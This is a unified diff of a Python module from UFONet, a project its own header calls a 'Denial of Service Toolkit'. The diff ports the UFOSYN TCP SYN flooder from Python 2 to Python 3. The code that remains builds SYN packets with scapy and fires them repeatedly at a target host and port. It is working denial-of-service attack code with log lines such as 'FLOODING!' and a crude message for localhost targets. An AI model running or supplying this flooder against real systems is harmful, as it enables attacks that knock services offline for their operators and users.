@@ -1,18 +1,23 @@
-#!/usr/bin/env python 
+#!/usr/bin/env python3 
 # -*- coding: utf-8 -*-"
 """
-UFONet - Denial of Service Toolkit - 2018 - by psy (epsylon@riseup.net)
+This file is part of the UFONet project, https://ufonet.03c8.net
+
+Copyright (c) 2013/2020 | psy <epsylon@riseup.net>
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-import sys, random, socket, time, urlparse
-
+import sys, random, socket, time
+try:
+    from urlparse import urlparse
+except:
+    from urllib.parse import urlparse
 try:
     from scapy.all import *
 except:
-    print "\nError importing: scapy lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python-scapy' or 'pip install scapy'\n"
+    print("\nError importing: scapy lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-scapy'\n")
     sys.exit(2)
 
 # UFONet TCP SYN Flooder (UFOSYN)
@@ -37,26 +42,26 @@ def synize(ip, port, rounds):
             try:
                 IP_p.dst = ip
             except:
-                print "[Error] [AI] [UFOSYN] Imposible to resolve IP from target -> [Aborting!]\n"
+                print("[Error] [AI] [UFOSYN] Imposible to resolve IP from target -> [Aborting!]\n")
                 break
             TCP_l = TCP()	
             TCP_l.sport = sport
             TCP_l.dport = port
             TCP_l.flags = "S" # SYN
             TCP_l.seq = seq
-	    TCP_l.window = window
+            TCP_l.window = window
             try:
                 send(IP_p/TCP_l, verbose=0)
-                print "[Info] [AI] [UFOSYN] Firing 'quantum hook' ["+str(n)+"] -> [FLOODING!]"
+                print("[Info] [AI] [UFOSYN] Firing 'quantum hook' ["+str(n)+"] -> [FLOODING!]")
                 time.sleep(1) # sleep time required for balanced sucess
             except:
-                print "[Error] [AI] [UFOSYN] Failed to engage with 'quantum hook' ["+str(n)+"]"
+                print("[Error] [AI] [UFOSYN] Failed to engage with 'quantum hook' ["+str(n)+"]")
     except:
         print("[Error] [AI] [UFOSYN] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class UFOSYN(object):
     def attacking(self, target, rounds):
-        print "[Info] [AI] TCP SYN Flooder (UFOSYN) is ready to fire: [" , rounds, "quantum hooks ]"
+        print("[Info] [AI] TCP SYN Flooder (UFOSYN) is ready to fire: [" , rounds, "quantum hooks ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
             port = 80
@@ -77,6 +82,6 @@ class UFOSYN(object):
             except:
                 ip = target
         if ip == "127.0.0.1" or ip == "localhost":
-            print "[Info] [AI] [UFOSYN] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n"
+            print("[Info] [AI] [UFOSYN] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
         synize(ip, port, rounds) # attack with UFOSYN using threading
